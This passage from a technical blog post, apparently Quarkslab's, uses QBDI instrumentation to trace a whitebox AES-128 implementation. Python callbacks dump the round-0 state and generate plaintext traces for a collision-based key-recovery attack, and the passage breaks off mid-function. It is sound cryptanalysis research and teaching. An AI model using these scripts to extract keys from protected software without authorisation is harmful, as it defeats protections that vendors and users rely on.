\"\"}}, \"type\": \"scattergeo\"}], \"scattergl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergl\"}], \"scattermapbox\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattermapbox\"}], \"scatterpolar\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolar\"}], \"scatterpolargl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolargl\"}], \"scatterternary\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterternary\"}], \"surface\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"surface\"}], \"table\": [{\"cells\": {\"fill\": {\"color\": \"#EBF0F8\"}, \"line\": {\"color\": \"white\"}}, \"header\": {\"fill\": {\"color\": \"#C8D4E3\"}, \"line\": {\"color\": \"white\"}}, \"type\": \"table\"}]}, \"layout\": {\"annotationdefaults\": {\"arrowcolor\": \"#2a3f5f\", \"arrowhead\": 0, \"arrowwidth\": 1}, \"coloraxis\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"colorscale\": {\"diverging\": [[0, \"#8e0152\"], [0.1, \"#c51b7d\"], [0.2, \"#de77ae\"], [0.3, \"#f1b6da\"], [0.4, \"#fde0ef\"], [0.5, \"#f7f7f7\"], [0.6, \"#e6f5d0\"], [0.7, \"#b8e186\"], [0.8, \"#7fbc41\"], [0.9, \"#4d9221\"], [1, \"#276419\"]], \"sequential\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"sequentialminus\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]]}, \"colorway\": [\"#636efa\", \"#EF553B\", \"#00cc96\", \"#ab63fa\", \"#FFA15A\", \"#19d3f3\", \"#FF6692\", \"#B6E880\", \"#FF97FF\", \"#FECB52\"], \"font\": {\"color\": \"#2a3f5f\"}, \"geo\": {\"bgcolor\": \"white\", \"lakecolor\": \"white\", \"landcolor\": \"#E5ECF6\", \"showlakes\": true, \"showland\": true, \"subunitcolor\": \"white\"}, \"hoverlabel\": {\"align\": \"left\"}, \"hovermode\": \"closest\", \"mapbox\": {\"style\": \"light\"}, \"paper_bgcolor\": \"white\", \"plot_bgcolor\": \"#E5ECF6\", \"polar\": {\"angularaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"radialaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"scene\": {\"xaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"yaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"zaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}}, \"shapedefaults\": {\"line\": {\"color\": \"#2a3f5f\"}}, \"ternary\": {\"aaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"baxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"caxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"title\": {\"x\": 0.05}, \"xaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}, \"yaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}}}, \"xaxis\": {\"anchor\": \"y\", \"domain\": [0.0, 1.0], \"title\": {\"text\": \"id\"}}, \"yaxis\": {\"anchor\": \"x\", \"domain\": [0.0, 1.0], \"title\": {\"text\": \"access\"}}}, {\"responsive\": true} ).then(function(){ var gd = document.getElementById('9e90807e-da07-46d0-81af-26373aae16af'); var x = new MutationObserver(function (mutations, observer) {{ var display = window.getComputedStyle(gd).display; if (!display || display === 'none') {{ console.log([gd, 'removed!']); Plotly.purge(gd); observer.disconnect(); }} }}); // Listen for the removal of the full notebook cells var notebookContainer = gd.closest('#notebook-container'); if (notebookContainer) {{ x.observe(notebookContainer, {childList: true}); }} // Listen for the clearing of the current output cell var outputEl = gd.closest('.output'); if (outputEl) {{ x.observe(outputEl, {childList: true}); }} }) }; ; </br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></script> \n  </div> \n  <p>On the above graph, we can learn a lot, just by looking at how the accesses are performed (<strong>The graph is dynamic, you can play with it!</strong>).</p> \n  <ul class=\"simple\"> \n   <li>The X-axis is the id of the access. 0 being the very first memory access of the execution</li> \n   <li>The Y-axis is the address accessed</li> \n  </ul> \n  <p>First of all, if we filter the graph to keep only the <strong>read</strong>, we can see an almost linearly accessed flow of data. It’s not of much use, but those represent the accesses to the whitebox tables.</p> \n  <p><img alt=\"read_access\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/read.png\" style=\"width: 855.45px; height: 360.90000000000003px;\" /> <em>Read accesses are the accesses to the whitebox precomputed tables.</em></p> \n  <p>If we decide to look at <strong>stack_write</strong> or <strong>stack_read</strong>, things get really interesting. Indeed, we can see a repeating pattern. That pattern is repeated 10 times (the last 3 are a bit different, they look “mirrored”).</p> \n  <p>Those patterns are characteristic of an [en|de]cryption algorithm. In fact, those 10 blocks are rounds of AES. If we have 10 rounds, it means it is <strong>AES-128</strong>.</p> \n  <blockquote>\n    Note: The last 3 rounds are duplicated. This is a common way to protect against Fault injection attacks. \n  </blockquote> \n  <p><img alt=\"stack_write_access\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/stack_write.png\" style=\"width: 848.7px; height: 360.0px;\" /> <em>Stack write accesses give information about the underlying algorithm</em></p> \n  <p>So we are facing an AES-128, perfect for the collision-based attack we just built. We need a few things to be able to run this attack:</p> \n  <ul class=\"simple\"> \n   <li>Observe the state of AES at the end of round 0</li> \n   <li>Generate collisions</li> \n  </ul> \n  <p>So how can we get access to the state at the end of round 0? First of all, we need to know where the state is located in memory.</p> \n  <p>If you were to look a bit closer at how data are accessed, you would see packs of 4 bytes being accessed almost sequentially.</p> \n  <p>Moreover, if you remember the <tt class=\"docutils literal\">encrypt</tt> function, it begins with a <tt class=\"docutils literal\">memcpy</tt>, copying the input bytes to a static buffer on the stack. This is the state initialization. So we know where the state is:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\">// s[0:16] is the state</span>\n<span class=\"kt\">uint8_t</span> <span class=\"n\">s</span><span class=\"p\">[</span><span class=\"mi\">42</span><span class=\"p\">];</span>\n<span class=\"p\">[...]</span>\n<span class=\"n\">memcpy</span><span class=\"p\">(</span><span class=\"n\">s</span><span class=\"p\">,</span> <span class=\"n\">buffer</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">);</span>\n</pre> \n  </div> \n  <p>Now, if we want to know where the end of round 0 happens, we can use the previous visualization to have an approximation of the end of the round. It happens around id 600/650 ~ (see the capture below, zoomed on the first 3 rounds of AES).</p> \n  <blockquote>\n    Note: The 2 big (8-byte-write) stack_write at the beginning are in fact the \n   <tt class=\"docutils literal\">memcpy</tt> that has been inlined. \n  </blockquote> \n  <p><img alt=\"zoom_r0\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/E_r0.png\" style=\"width: 854.5500000000001px; height: 371.25px;\" /> <em>Zoom on the first 3 rounds of AES</em></p> \n  <p>We can see that at every round, each byte of the state is being written twice, before we move on to the next round. This basic heuristic is enough for us to determine where the round 0 ends.</p> \n  <p>Let’s modify a bit the callback and the instrumentation to get those data. We can retrieve the address of the state by looking at the first accesses of size 8 (we can see the <tt class=\"docutils literal\">memcpy</tt> reading our input buffer, and then writing it to the stack).</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">memory_accesses</span><span class=\"p\">[</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">][</span><span class=\"mi\">3</span><span class=\"p\">:</span><span class=\"mi\">7</span><span class=\"p\">]</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\n[{'id': 3, 'access': 52139832, 'type': 'buffer_read', 'size': 8},\n {'id': 4, 'access': 52139824, 'type': 'buffer_read', 'size': 8},\n {'id': 5, 'access': 140224210382672, 'type': 'stack_write', 'size': 8},\n {'id': 6, 'access': 140224210382680, 'type': 'stack_write', 'size': 8}]\n</pre> \n  <p>The start of the buffer is at <tt class=\"docutils literal\">rsp - 0xc0</tt>, we will use this to detect the end of round 0 as demonstrated in the snippet below:</p> \n  <blockquote>\n    Note: Since we need only the state at the end of round 0, we can stop the execution of the function after the first round and move on. This speeds up the process a bit. \n  </blockquote> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># Callback, called on every memory access</span>\n<span class=\"k\">def</span> <span class=\"nf\">mem_cbk</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">,</span> <span class=\"n\">gpr</span><span class=\"p\">,</span> <span class=\"n\">fpr</span><span class=\"p\">,</span> <span class=\"n\">cb_data</span><span class=\"p\">):</span>\n    <span class=\"c1\"># State address on the stack</span>\n    <span class=\"n\">state_addr</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"stack\"</span><span class=\"p\">]</span> <span class=\"o\">-</span> <span class=\"mh\">0xc0</span>\n    <span class=\"n\">accesses</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">]</span>\n    <span class=\"n\">byte_access</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"byte_access\"</span><span class=\"p\">]</span>\n\n    <span class=\"c1\"># Keep a counter on the number of memory accesses</span>\n    <span class=\"n\">ctr</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"ctr\"</span><span class=\"p\">]</span>\n    <span class=\"n\">memaccess</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getInstMemoryAccess</span><span class=\"p\">()</span>\n    <span class=\"k\">for</span> <span class=\"n\">acc</span> <span class=\"ow\">in</span> <span class=\"n\">memaccess</span><span class=\"p\">:</span>\n        <span class=\"c1\"># We are interested in accesses to the state</span>\n        <span class=\"k\">if</span> <span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">accessAddress</span> <span class=\"ow\">not</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">state_addr</span><span class=\"p\">,</span> <span class=\"n\">state_addr</span><span class=\"o\">+</span><span class=\"mi\">16</span><span class=\"p\">):</span>\n            <span class=\"k\">continue</span>\n        <span class=\"n\">rw_type</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"s2\">\"write\"</span><span class=\"p\">,</span> <span class=\"s2\">\"read\"</span><span class=\"p\">][</span><span class=\"ow\">not</span> <span class=\"p\">(</span><span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">type</span> <span class=\"o\">&amp;</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">MEMORY_WRITE</span><span class=\"p\">)]</span>\n        <span class=\"c1\"># We are interested only in writes</span>\n        <span class=\"k\">if</span> <span class=\"n\">rw_type</span> <span class=\"o\">!=</span> <span class=\"s2\">\"write\"</span><span class=\"p\">:</span>\n            <span class=\"k\">continue</span>\n        <span class=\"c1\"># We are interested in 1 byte accesses (to filter out the memcpy)</span>\n        <span class=\"k\">if</span> <span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">size</span> <span class=\"o\">!=</span> <span class=\"mi\">1</span><span class=\"p\">:</span>\n            <span class=\"k\">continue</span>\n\n        <span class=\"c1\"># Store information about the memory access</span>\n        <span class=\"n\">accesses</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">({</span><span class=\"s2\">\"id\"</span><span class=\"p\">:</span><span class=\"n\">ctr</span><span class=\"p\">,</span> <span class=\"s2\">\"access\"</span><span class=\"p\">:</span> <span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">accessAddress</span><span class=\"p\">,</span> <span class=\"s2\">\"type\"</span><span class=\"p\">:</span><span class=\"n\">rw_type</span><span class=\"p\">,</span> <span class=\"s2\">\"size\"</span><span class=\"p\">:</span><span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">size</span><span class=\"p\">})</span>\n        <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"ctr\"</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n\n        <span class=\"c1\"># Record the number of time each byte is being written</span>\n        <span class=\"n\">byte_access</span><span class=\"p\">[</span><span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">accessAddress</span> <span class=\"o\">-</span> <span class=\"n\">state_addr</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n        <span class=\"c1\"># If each byte has been accessed twice, we stop the execution</span>\n        <span class=\"k\">if</span> <span class=\"n\">byte_access</span> <span class=\"o\">==</span> <span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span><span class=\"p\">:</span>\n            <span class=\"c1\"># Dump the intermediate state</span>\n            <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"state_e0\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">readMemory</span><span class=\"p\">(</span><span class=\"n\">state_addr</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">)</span>\n            <span class=\"k\">return</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">STOP</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">CONTINUE</span>\n</pre> \n  </div> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>\n    <span class=\"n\">encrypt_ptr</span> <span class=\"o\">=</span> <span class=\"n\">load_wb</span><span class=\"p\">()</span>\n    <span class=\"n\">vm</span> <span class=\"o\">=</span> <span class=\"n\">instanciate_vm</span><span class=\"p\">(</span><span class=\"n\">encrypt_ptr</span><span class=\"p\">)</span>\n\n    <span class=\"n\">buffer_ptr</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">allocateMemory</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># Add memory callback</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getGPRState</span><span class=\"p\">()</span>\n    <span class=\"n\">cb_data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">:[],</span> <span class=\"s2\">\"ctr\"</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"s2\">\"stack\"</span><span class=\"p\">:</span> <span class=\"n\">state</span><span class=\"o\">.</span><span class=\"n\">rsp</span><span class=\"p\">,</span> <span class=\"s2\">\"byte_access\"</span><span class=\"p\">:[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span><span class=\"p\">,</span> <span class=\"s2\">\"state_e0\"</span><span class=\"p\">:</span> <span class=\"kc\">None</span><span class=\"p\">}</span>\n    <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">addMemAccessCB</span><span class=\"p\">(</span><span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">MEMORY_READ_WRITE</span><span class=\"p\">,</span> <span class=\"n\">mem_cbk</span><span class=\"p\">,</span> <span class=\"n\">cb_data</span><span class=\"p\">)</span>\n\n    <span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">,</span> <span class=\"n\">encrypt_ptr</span><span class=\"p\">,</span> <span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"State at the end of round 0 : \"</span><span class=\"p\">,</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"state_e0\"</span><span class=\"p\">]))</span>\n    <span class=\"k\">return</span> <span class=\"n\">cb_data</span>\n\n<span class=\"n\">memory_accesses</span> <span class=\"o\">=</span> <span class=\"n\">main</span><span class=\"p\">()</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nState at the end of round 0 :  [45, 127, 179, 60, 184, 146, 58, 29, 6, 243, 40, 93, 17, 113, 101, 61]\n</pre> \n </div> \n <div class=\"section\" id=\"generating-collisions\"> \n  <h3>Generating collisions</h3> \n  <p>We can now observe the state at the end of round 0, so we can get started with the collision attack. First we need to generate a few collisions. To optimize a bit the algorithm, we will tweak the way we are generating traces. If you remember, we break 2 bytes of key, and then the 2 remaining bytes. We have to do this 4 times, for the 4 independent blocks of AES.</p> \n  <p>Since the operations are independent, we can attack the 4 blocks at the same time, so instead of modifying only 2 bytes per plaintext, we will modify <span class=\"math\">\\(4 \\times 2\\)</span> bytes, and observe collisions independently on each block of the output. This helps getting collisions for half of the key; it then needs to be done for the other half of the key.</p> \n  <blockquote>\n    Note: All previous examples were executed with \n   <tt class=\"docutils literal\"><span class=\"pre\">\"input_bytes\":[0,</span> 5, 10, 15]</tt>. This was handy because you do not need to take care of endinanness for the test as bytes are mirrored. For the following, we need to take care of it, so don’t be troubled by the \n   <tt class=\"docutils literal\">key = <span class=\"pre\">key[::-1]</span></tt> and \n   <tt class=\"docutils literal\"><span class=\"pre\">input_data[::-1]</span></tt> that are here to properly represent the endianness. \n  </blockquote> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">RELATIONSHIP</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">5</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">,</span> <span class=\"mi\">15</span><span class=\"p\">]},</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"mi\">6</span><span class=\"p\">,</span><span class=\"mi\">7</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">6</span><span class=\"p\">,</span> <span class=\"mi\">11</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">]},</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">8</span><span class=\"p\">,</span><span class=\"mi\">9</span><span class=\"p\">,</span><span class=\"mi\">10</span><span class=\"p\">,</span><span class=\"mi\">11</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">7</span><span class=\"p\">,</span> <span class=\"mi\">8</span><span class=\"p\">,</span> <span class=\"mi\">13</span><span class=\"p\">]},</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">12</span><span class=\"p\">,</span><span class=\"mi\">13</span><span class=\"p\">,</span><span class=\"mi\">14</span><span class=\"p\">,</span><span class=\"mi\">15</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">3</span><span class=\"p\">,</span> <span class=\"mi\">4</span><span class=\"p\">,</span> <span class=\"mi\">9</span><span class=\"p\">,</span> <span class=\"mi\">14</span><span class=\"p\">]},</span>\n<span class=\"p\">]</span>\n\n<span class=\"kn\">import</span> <span class=\"nn\">random</span>\n<span class=\"k\">def</span> <span class=\"nf\">generate_traces</span><span class=\"p\">(</span><span class=\"n\">n_traces</span><span class=\"p\">,</span> <span class=\"n\">half</span><span class=\"p\">):</span>\n    <span class=\"n\">encrypt_ptr</span> <span class=\"o\">=</span> <span class=\"n\">load_wb</span><span class=\"p\">()</span>\n    <span class=\"n\">vm</span> <span class=\"o\">=</span> <span class=\"n\">instanciate_vm</span><span class=\"p\">(</span><span class=\"n\">encrypt_ptr</span><span class=\"p\">)</span>\n\n    <span class=\"n\">buffer_ptr</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">allocateMemory</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># Add memory callback</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getGPRState</span><span class=\"p\">()</span>\n    <span class=\"n\">cb_data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">:[],</span> <span class=\"s2\">\"ctr\"</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"s2\">\"stack\"</span><span class=\"p\">:</span> <span class=\"n\">state</span><span class=\"o\">.</span><span class=\"n\">rsp</span><span class=\"p\">,</span> <span class=\"s2\">\"byte_access\"</span><span class=\"p\">:[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span><span class=\"p\">,</span> <span class=\"s2\">\"state_e0\"</span><span class=\"p\">:</span> <span class=\"kc\">None</span><span class=\"p\">}</span>\n    <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">addMemAccessCB</span><span class=\"p\">(</span><span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">MEMORY_READ_WRITE</span><span class=\"p\">,</span> <span class=\"n\">mem_cbk</span><span class=\"p\">,</span> <span class=\"n\">cb_data</span><span class=\"p\">)</span>\n\n    <span class=\"n\">traces</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">n_traces</span><span class=\"p\">):</span>\n        <span class=\"n\">input_data</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n\n        <span class=\"k\">for</span> <span class=\"n\">r</span> <span class=\"ow\">in</span> <span class=\"n\">RELATIONSHIP</span><span class=\"p\">:</span>\n            <span class=\"n\">input_data</span><span class=\"p\">[</span><span class=\"n\">r</span><span class=\"p\">[</span><span class=\"s2\">\"input_bytes\"</span><span class=\"p\">][</span><span class=\"mi\">2</span><span class=\"o\">*</span><span class=\"n\">half</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"n\">random</span><span class=\"o\">.</span><span class=\"n\">randint</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">255</span><span class=\"p\">)</span>\n            <span class=\"n\">input_data</span><span class=\"p\">[</span><span class=\"n\">r</span><span class=\"p\">[</span><span class=\"s2\">\"input_bytes\"</span><span class=\"p\">][(</span><span class=\"mi\">2</span><span class=\"o\">*</span><span class=\"n\">half</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"n\">random</span><span class=\"o\">.</span><span class=\"n\">randint</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">255</span><span class=\"p\">)</span>\n        <span class=\"n\">input_data</span> <span class=\"o\">=</span> <span class=\"n\">input_data</span><span class=\"p\">[::</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n\n        <span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">,</span> <span class=\"n\">encrypt_ptr</span><span class=\"p\">,</span> <span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"n\">input_data</span><span class=\"p\">)</span>\n        <span class=\"n\">state_e0</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"state_e0\"</span><span class=\"p\">])</span>\n        <span class=\"n\">traces</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">({</span><span class=\"s1\">'input_data'</span><span class=\"p\">:</span><span class=\"n\">input_data</span><span class=\"p\">,</span> <span class=\"s2\">\"state_e0\"</span><span class=\"p\">:</span><span class=\"n\">state_e0</span><span class=\"p\">})</span>\n        <span class=\"c1\"># reset data</span>\n        <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"p\">[]</span> <span class=\"p\">;</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"ctr\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n        <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"byte_access\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span> <span class=\"p\">;</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"state_e0\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"kc\">None</span>\n    <span class=\"k\">return</span> <span class=\"n\">traces</span>\n\n<span class=\"c1\"># We need two sets of traces,to break 2 bytes per block, then the 2 remaining bytes.</span>\n<span class=\"n\">traces_half0</span> <span class=\"o\">=</span> <span class=\"n\">generate_traces</span><span class=\"p\">(</span><span class=\"mi\">64</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"n\">traces_half1</span> <span class=\"o\">=</span> <span class=\"n\">generate_traces</span><span class=\"p\">(</span><span class=\"mi\">64</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <p>So we generated two sets of traces. The first set of traces is made to break the first half of the key (in the previous examples <span class=\"math\">\\(k_0\\)</span> and <span class=\"math\">\\(k_5\\)</span>) for the 4 blocks of AES. While the second set of traces will be used to break the remaining bytes of the key (<span class=\"math\">\\(k_{10}\\)</span> and <span class=\"math\">\\(k_{15}\\)</span>).</p> \n  <p>Now we need to look for collisions in those traces. We are looking for collisions by checking if two plaintexts give an identical output byte.</p> \n  <blockquote>\n    Note: In the example, we are always looking at a single byte \n   <tt class=\"docutils literal\">target_byte</tt>. To be more efficient, and minimize the number of required traces, one could check for collisions on each of the affected bytes. However to keep things simple, we will always be looking for collisions on the same output byte for each block. \n  </blockquote> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># Look for collisions in traces</span>\n<span class=\"k\">def</span> <span class=\"nf\">find_collisions</span><span class=\"p\">(</span><span class=\"n\">traces</span><span class=\"p\">,</span> <span class=\"n\">target_byte</span><span 